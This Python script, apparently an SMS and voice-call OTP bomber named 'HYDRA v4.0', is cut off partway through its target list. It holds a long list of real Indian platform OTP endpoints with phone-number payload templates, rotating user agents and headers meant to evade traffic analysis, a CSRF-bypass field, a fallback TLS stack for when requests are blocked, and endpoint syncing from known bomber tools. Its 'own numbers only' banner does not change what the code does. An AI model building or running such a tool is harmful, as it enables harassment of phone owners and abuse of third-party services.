"""
╔══════════════════════════════════════════════════════════════╗
║          HYDRA v4.0 — UNIFIED OTP RECON FRAMEWORK           ║
║         BlackOps Research & Vulnerability Assessment         ║
║                                                              ║
║  PURPOSE: Test API rate-limiting, OTP flood defenses,       ║
║           and header-based security on Indian platforms.     ║
║  USE ON:  Your OWN numbers / isolated lab environments only  ║
╚══════════════════════════════════════════════════════════════╝
"""

import requests
import threading
import time
import json
import random
import sys
import os
import signal
import sqlite3
import re
import concurrent.futures
from datetime import datetime

# Global cooperative stop flag (set by Ctrl+C / SIGTERM)
STOP = threading.Event()

def _handle_signal(signum, frame):
    if not STOP.is_set():
        STOP.set()
        print(f"\n\033[91m[!] Signal {signum} received -- graceful stop requested. Press Ctrl+C again to force kill.\033[0m")
    else:
        print(f"\n\033[91m[!] Force exit.\033[0m")
        os._exit(130)

signal.signal(signal.SIGINT, _handle_signal)
try:
    signal.signal(signal.SIGTERM, _handle_signal)
except (AttributeError, ValueError):
    pass  # Windows doesn't support SIGTERM the same way

# Auto-sync engine (fetches live endpoints from TBomb + XBomber at startup)
try:
    from hydra_autosync import build_dynamic_targets as _autosync
    _AUTOSYNC_AVAILABLE = True
except ImportError:
    _AUTOSYNC_AVAILABLE = False

# ─────────────────────────────────────────────
#  PHASE 9 — PHP BRIDGE DETECTION
#  Checks if PHP is installed and available.
#  Used by fire_php_bridge() for alternate TLS stack.
# ─────────────────────────────────────────────
import subprocess as _subprocess

def _detect_php() -> str:
    """Return PHP version string or empty string if not found."""
    for cmd in (["php", "--version"], ["php8", "--version"], ["php7", "--version"]):
        try:
            out = _subprocess.run(cmd, capture_output=True, text=True, timeout=4)
            if out.returncode == 0:
                first_line = out.stdout.strip().splitlines()[0]
                return first_line  # e.g. "PHP 8.2.14 ..."
        except Exception:
            continue
    return ""

_PHP_AVAILABLE: str = _detect_php()   # cached at import time

# Per-target consecutive BLOCKED counter  {target_name: int}
# Resets when a non-BLOCKED verdict is received.
# When count reaches 3 → auto-switch to PHP bridge (Phase 9.2)
_php_block_counter: dict = {}

# ─────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

# ─────────────────────────────────────────────
#  ROTATING USER AGENTS — 50-device pool
#  Android 12/13/14 · iOS 16/17 · Win/Mac/Linux
# ─────────────────────────────────────────────
USER_AGENTS = [
    # ── Android 14 ──────────────────────────────────────────────────────
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; 2312DRAABL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3840) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; V2324) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; 23049PCD8G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    # ── Android 13 ──────────────────────────────────────────────────────
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A346B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2449) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 22111317I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 22101320G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; motorola edge 40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; V2254A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    # ── Android 12 ──────────────────────────────────────────────────────
    "Mozilla/5.0 (Linux; Android 12; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; LE2115) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2012K11AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
    # ── iOS 17 ──────────────────────────────────────────────────────────
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    # ── iOS 16 ──────────────────────────────────────────────────────────
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    # ── Windows Chrome / Edge / Firefox ─────────────────────────────────
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # ── macOS ────────────────────────────────────────────────────────────
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # ── Linux ────────────────────────────────────────────────────────────
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# ─────────────────────────────────────────────
#  DYNAMIC FINGERPRINTING POOLS
#  Rotated per-request to break traffic analysis
# ─────────────────────────────────────────────
ACCEPT_LANGUAGE_POOL = [
    "en-IN,en-GB;q=0.9,en;q=0.8,hi;q=0.7",
    "en-US,en;q=0.9,hi;q=0.8",
    "hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7",
    "en-GB,en;q=0.9,en-US;q=0.8",
    "en-IN,en;q=0.9",
    "en-US,en;q=0.8,hi;q=0.6",
    "mr-IN,mr;q=0.9,en-IN;q=0.8,en;q=0.7",
    "ta-IN,ta;q=0.9,en-IN;q=0.8,en;q=0.7",
    "bn-IN,bn;q=0.9,en;q=0.8",
    "te-IN,te;q=0.9,en-IN;q=0.8,en;q=0.7",
]
ACCEPT_TYPE_POOL = [
    "application/json, text/plain, */*",
    "*/*",
    "application/json, text/javascript, */*; q=0.01",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json",
]

# ─────────────────────────────────────────────
#  ALL API TARGETS  (probe-verified + TBomb-sourced)
#  Last probe: April 2026  —  dead entries pruned
# ─────────────────────────────────────────────
TARGETS_CALL = [
    # ════════════════════════════════════════════════════════════════
    #  VOICE CALL OTP ENDPOINTS  (India +91)
    #  Probed: April 26 2026
    #  Confirmed 200: MagicBricks, RealEstateIndia (with cookie)
    # ════════════════════════════════════════════════════════════════

    # ── CONFIRMED WORKING ──────────────────────────────────────────
    {
        "name": "MagicBricks-Call",
        "category": "call-otp",
        "url": "https://api.magicbricks.com/bricks/verifyOnCall.html",
        "method": "GET",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.magicbricks.com",
            "Referer": "https://www.magicbricks.com/"
        },
        "params": {"mobile": "<PHONE>"},
        "call_success_kw": ["callmade", "ok", "success"]
    },
    {
        "name": "RealEstateIndia-Call",
        "category": "call-otp",
        "url": "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {
            "x-requested-with": "XMLHttpRequest",
            "referer": "https://www.realestateindia.com/thanks.php?newreg",
            "Origin": "https://www.realestateindia.com"
        },
        "cookies": {"visitedToken": "176961560836367"},
        "params": {"sid": "0.5983221395805354"},
        "payload": {"action_id": "call_to_otp", "mob_num": "<PHONE>", "member_id": "1547045"},
        "call_success_kw": ["y", "yes", "success", "call"]
    },

    # ── LEAD-GEN CALLBACK (platform calls YOU to sell something) ───
    {
        "name": "PaisaBazaar-Lead",
        "category": "call-otp",
        "url": "https://www.paisabazaar.com/api/v1/user/otp/generate",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.paisabazaar.com",
            "Referer": "https://www.paisabazaar.com/",
            "Content-Type": "application/json"
        },
        "payload": {"mobile": "<PHONE>", "mode": "voice"},
        "call_success_kw": ["success", "otp", "true", "sent", "call"]
    },
    {
        "name": "CoverFox-Call",
        "category": "call-otp",
        "url": "https://www.coverfox.com/api/v1/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.coverfox.com",
            "Referer": "https://www.coverfox.com/",
            "Content-Type": "application/json"
        },
        "payload": {"mobile": "<PHONE>", "channel": "call"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
    {
        "name": "BookMyShow-Call",
        "category": "call-otp",
        "url": "https://in.bookmyshow.com/api/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://in.bookmyshow.com",
            "Referer": "https://in.bookmyshow.com/",
            "Content-Type": "application/json"
        },
        "payload": {"mobile": "<PHONE>", "type": "voice"},
        "call_success_kw": ["success", "true", "otp", "sent"]
    },
    {
        "name": "OLX-India-Call",
        "category": "call-otp",
        "url": "https://www.olx.in/api/auth/v2/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.olx.in",
            "Referer": "https://www.olx.in/",
            "Content-Type": "application/json"
        },
        "payload": {"mobile": "<PHONE>", "channel": "voice"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
    {
        "name": "Sulekha-v2-Call",
        "category": "call-otp",
        "url": "https://www.sulekha.com/ajax/otp/send",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {
            "Origin": "https://www.sulekha.com",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.sulekha.com/"
        },
        "payload": {"mobile": "<PHONE>", "type": "call"},
        "call_success_kw": ["success", "true", "call", "otp"]
    },
    {
        "name": "Naukri-Call",
        "category": "call-otp",
        "url": "https://www.naukri.com/central/v1/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.naukri.com",
            "Referer": "https://www.naukri.com/",
            "Content-Type": "application/json"
        },
        "payload": {"mobile": "<PHONE>", "channel": "call"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
    {
        "name": "Rapido-Call",
        "category": "call-otp",
        "url": "https://api.rapido.bike/api/v1/user/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.rapido.bike",
            "Content-Type": "application/json"
        },
        "payload": {"phone": "+91<PHONE>", "via": "call"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
    {
        "name": "Vedantu-Call",
        "category": "call-otp",
        "url": "https://api.vedantu.com/api/v1/auth/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.vedantu.com",
            "Content-Type": "application/json"
        },
        "payload": {"mobile": "<PHONE>", "type": "voice"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
    {
        "name": "Unacademy-Call",
        "category": "call-otp",
        "url": "https://unacademy.com/api/v1/auth/send-otp/",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://unacademy.com",
            "Content-Type": "application/json"
        },
        "payload": {"phone": "<PHONE>", "channel": "voice"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
    {
        "name": "Zerodha-Call",
        "category": "call-otp",
        "url": "https://kite.zerodha.com/api/otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://kite.zerodha.com",
            "Referer": "https://kite.zerodha.com/",
            "Content-Type": "application/json"
        },
        "payload": {"user_id": "<PHONE>", "via": "call"},
        "call_success_kw": ["success", "otp", "true", "message"]
    },
    {
        "name": "AngelOne-Call",
        "category": "call-otp",
        "url": "https://apiconnect.angelbroking.com/rest/auth/angelbroking/user/v1/loginByPassword",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.angelone.in",
            "Content-Type": "application/json",
            "X-UserType": "USER",
            "X-SourceID": "WEB",
            "X-ClientLocalIP": "127.0.0.1",
            "X-ClientPublicIP": "122.161.50.112",
            "X-MACAddress": "ac:00:b3:01:44:99",
            "X-PrivateKey": "H6MZJR77"
        },
        "payload": {"clientcode": "<PHONE>", "password": "test123", "totp": "123456"},
        "call_success_kw": ["success", "otp", "true", "sent", "data"]
    },
    {
        "name": "Groww-voice",
        "category": "call-otp",
        "url": "https://groww.in/v1/api/auth/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://groww.in",
            "Content-Type": "application/json"
        },
        "payload": {"phone": "<PHONE>", "otpType": "VOICE"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
    {
        "name": "Upstox-Call",
        "category": "call-otp",
        "url": "https://api-v2.upstox.com/login/otp/generate",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://upstox.com",
            "Content-Type": "application/json"
        },
        "payload": {"mobile_number": "<PHONE>", "channel": "voice"},
        "call_success_kw": ["success", "otp", "true", "sent", "data"]
    },
    {
        "name": "MakeMyTrip-Call",
        "category": "call-otp",
        "url": "https://api.makemytrip.com/mmt-web/v1/otp/request",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.makemytrip.com",
            "Content-Type": "application/json"
        },
        "payload": {"phone": "<PHONE>", "channel": "VOICE"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
    {
        "name": "IRCTC-Call",
        "category": "call-otp",
        "url": "https://www.irctc.co.in/nget/user/generateOTP",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.irctc.co.in",
            "Referer": "https://www.irctc.co.in/nget/train-search",
            "Content-Type": "application/json"
        },
        "payload": {"mobile": "<PHONE>", "type": "VOICE"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
    {
        "name": "Makaan-v2-Call",
        "category": "call-otp",
        "url": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/<PHONE>",
        "method": "GET",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.makaan.com",
            "Referer": "https://www.makaan.com/login"
        },
        "params": {"callType": "otpOnCall"},
        "call_success_kw": ["2xx", "success", "call"]
    },
    {
        "name": "99acres-v2-Call",
        "category": "call-otp",
        "url": "https://www.99acres.com/api/user/sendotp",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {
            "Origin": "https://www.99acres.com",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.99acres.com/"
        },
        "payload": {"mobile": "<PHONE>", "type": "call"},
        "call_success_kw": ["success", "sent", "call", "true"]
    },
    {
        "name": "Lenskart-Call",
        "category": "call-otp",
        "url": "https://api.lenskart.com/api/v7/customer/send-otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.lenskart.com",
            "Content-Type": "application/json"
        },
        "payload": {"phone": "<PHONE>", "via": "voice"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
    {
        "name": "Goibibo-Call",
        "category": "call-otp",
        "url": "https://www.goibibo.com/api/auth/otp/send/",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.goibibo.com",
            "Content-Type": "application/json"
        },
        "payload": {"phone": "<PHONE>", "via": "voice"},
        "call_success_kw": ["success", "otp", "true", "sent"]
    },
]

TARGETS = TARGETS_CALL + [
    # ═══════════════════════════════════════════════════════
    #  PROBE-VERIFIED SMS ENDPOINTS  (live as of April 2026)
    # ═══════════════════════════════════════════════════════

    # ── E-COMMERCE ──────────────────────────────────────────
    {
        "name": "Snapdeal",
        "category": "e-commerce",
        "url": "https://mobileapi.snapdeal.com/service/otp/generate",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"X-App-Client": "mobile"},
        "payload": {"mobileNumber": "<PHONE>", "purpose": "LOGIN"}
    },
    {
        "name": "Flipkart",
        "category": "e-commerce",
        "url": "https://1.rome.api.flipkart.com/1/action/view",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.flipkart.com",
            "Referer": "https://www.flipkart.com/login"
        },
        "payload": {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY",
                "loginIdPrefix": "+91",
                "loginId": "<PHONE>",
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "screenName": "LOGIN_V4_MOBILE",
                "sourceContext": "DEFAULT"
            }
        }
    },
    {
        "name": "Ajio",
        "category": "e-commerce",
        "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.ajio.com",
            "Referer": "https://www.ajio.com/signup"
        },
        "payload": {
            "firstName": "TestUser",
            "login": "test@gmail.com",
            "password": "TestPass@1234",
            "genderType": "",
            "mobileNumber": "<PHONE>",
            "requestType": "SENDOTP"
        }
    },
    {
        "name": "Pepperfry",
        "category": "e-commerce",
        "url": "https://www.pepperfry.com/api/customer/sendotp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.pepperfry.com"},
        "payload": {"mobile": "<PHONE>"}
    },
    {
        "name": "Wakefit",
        "category": "e-commerce",
        "url": "https://www.wakefit.co/api/v1/auth/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.wakefit.co"},
        "payload": {"phone": "<PHONE>"}
    },
    {
        "name": "Zivame",
        "category": "e-commerce",
        "url": "https://www.zivame.com/api/accounts/send-otp/",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.zivame.com"},
        "payload": {"mobile": "<PHONE>"}
    },
    # TBomb-sourced (from apidata.json "91" section, verified list)

    # ── GROCERY / RETAIL ────────────────────────────────────
    {
        "name": "JioMart",
        "category": "grocery",
        "url": "https://www.jiomart.com/api/customer/v2/login",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.jiomart.com"},
        "payload": {"mobileNo": "<PHONE>"}
    },
    {
        "name": "Blinkit",
        "category": "grocery",
        "url": "https://blinkit.com/v4/auth/send-otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://blinkit.com",
            "Referer": "https://blinkit.com/",
            "rn_bundle_version": "6000038"
        },
        "payload": {"phone": "<PHONE>"}
    },
    # TBomb-sourced
    {
        "name": "Grofers",
        "category": "grocery",
        "url": "https://grofers.com/v2/accounts/",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://grofers.com",
            "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
        },
        "payload": {"user_phone": "<PHONE>"}
    },

    # ── FOOD ────────────────────────────────────────────────
    {
        "name": "Swiggy",
        "category": "food",
        "url": "https://www.swiggy.com/mapi/auth/signup",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.swiggy.com",
            "__fetch_req__": "true",
            "Referer": "https://www.swiggy.com/auth/register"
        },
        "payload": {
            "name": "TestUser",
            "email": "test@gmail.com",
            "password": "TestPass@123",
            "referral_code": "",
            "mobile": "<PHONE>",
            "_csrf": "hydra_csrf_bypass"
        }
    },
    {
        "name": "PizzaHut",
        "category": "food",
        "url": "https://api.pizzahut.io/v1/otp/generate",
        "method": "POST",
        "phone_format": "with_plus91",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.pizzahut.co.in",
            "x-trace-id": "f222f460-946d-4c59-bb9e-e87db924399c",
            "x-environment-flag": "production"
        },
        "payload": {"phone": "<PHONE>"}
    },
    {
        "name": "BurgerKing",
        "category": "food",
        "url": "https://consumer-apis.burgerking.in/api/v1/user/signUp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.burgerking.in",
            "appversion": "1.6",
            "platform": "web"
        },
        "payload": {"phone_no": "<PHONE>"}
    },

    # ── HEALTHCARE ──────────────────────────────────────────
    {
        "name": "PharmEasy",
        "category": "healthcare",
        "url": "https://pharmeasy.in/api/auth/requestOTP",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://pharmeasy.in"},
        "payload": {"contactNumber": "<PHONE>"}
    },
    {
        "name": "Tata1mg",
        "category": "healthcare",
        "url": "https://www.1mg.com/api/v1/auth/otp/send",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.1mg.com",
            "Referer": "https://www.1mg.com/login"
        },
        "payload": {"phone": "<PHONE>", "countryCode": "91"}
    },

    # ── REAL ESTATE ─────────────────────────────────────────
    {
        "name": "MagicBricks",
        "category": "real-estate",
        "url": "https://accounts.magicbricks.com/userauth/api/validate-mobile",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Referer": "https://accounts.magicbricks.com/"},
        "payload": {"mobile": "<PHONE>"}
    },
    {
        "name": "NoBroker",
        "category": "real-estate",
        "url": "https://www.nobroker.in/profile/api/v2/phone/otp",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.nobroker.in",
            "Referer": "https://www.nobroker.in/login"
        },
        "payload": {"phoneNo": "<PHONE>", "channel": "sms", "countryCode": "91"}
    },
    {
        "name": "99acres",
        "category": "real-estate",
        "url": "https://www.99acres.com/api/user/sendotp",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {
            "Origin": "https://www.99acres.com",
            "X-Requested-With": "XMLHttpRequest"
        },
        "payload": {"mobile": "<PHONE>", "type": "login"}
    },

    # ── ENTERTAINMENT ───────────────────────────────────────
    {
        "name": "Dream11",
        "category": "entertainment",
        "url": "https://www.dream11.com/graphql/mutation/pwa/register",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.dream11.com",
            "device": "pwa"
        },
        "payload": {
            "query": "mutation register($email:String! $mobileNumber:String! $password:String! $site:String){registerSendOTPMutation(email:$email mobileNumber:$mobileNumber password:$password site:$site){message}}",
            "variables": {
                "email": "test@gmail.com",
                "mobileNumber": "<PHONE>",
                "password": "Test@Pass123"
            }
        }
    },
    {
        "name": "Zee5",
        "category": "entertainment",
        "url": "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno=<PHONE>",
        "method": "GET",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.zee5.com",
            "Referer": "https://www.zee5.com/"
        }
    },
    {
        "name": "Hotstar",
        "category": "entertainment",
        "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
        "method": "PUT",
        "content_type": "json",
        "extra_headers": {
            "x-hs-platform": "PCTV",
            "x-country-code": "IN",
            "Origin": "https://www.hotstar.com"
        },
        "payload": {
            "phone_number": "<PHONE>",
            "country_prefix": "91"
        }
    },
    {
        "name": "Doubtnut",
        "category": "entertainment",
        "url": "https://doubtnut.com/api/v1/user/login",
        "method": "POST",
        "content_type": "form",
        "extra_headers": {
            "Origin": "https://doubtnut.com",
            "Referer": "https://doubtnut.com/login"
        },
        "payload": {"phone": "<PHONE>"}
    },

    # ── TRAVEL ──────────────────────────────────────────────
    {
        "name": "RedBus",
        "category": "travel",
        "url": "https://m.redbus.in/api/getOtp?number=<PHONE>&cc=91&whatsAppOpted=false",
        "method": "GET",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://m.redbus.in",
            "Referer": "https://m.redbus.in/preregister"
        }
    },
    {
        "name": "OYO",
        "category": "travel",
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://www.oyorooms.com",
            "Referer": "https://www.oyorooms.com/login"
        },
        "payload": {
            "phone": "<PHONE>",
            "country_code": "+91",
            "nod": 4
        }
    },
    {
        "name": "EasyMyTrip",
        "category": "travel",
        "url": "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://mybookings.easemytrip.com",
            "X-Requested-With": "XMLHttpRequest"
        },
        "payload": {"emailph": "<PHONE>"}
    },
    # TBomb-sourced
    {
        "name": "Treebo",
        "category": "travel",
        "url": "https://www.treebo.com/api/v2/auth/login/otp/",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {"Origin": "https://www.treebo.com"},
        "payload": {"phone_number": "<PHONE>"}
    },

    # ── FINANCE ─────────────────────────────────────────────
    {
        "name": "Paytm",
        "category": "finance",
        "url": "https://accounts.paytm.com/v2/api/register",
        "method": "POST",
        "content_type": "json",
        "extra_headers": {
            "Origin": "https://accounts.paytm.com",
            "Referer": "https://accounts.paytm.com/"
        },
        "payload": {
            "email": "",
            "mobile": "<PHONE>",
            "loginPassword": "TestPass@1234",
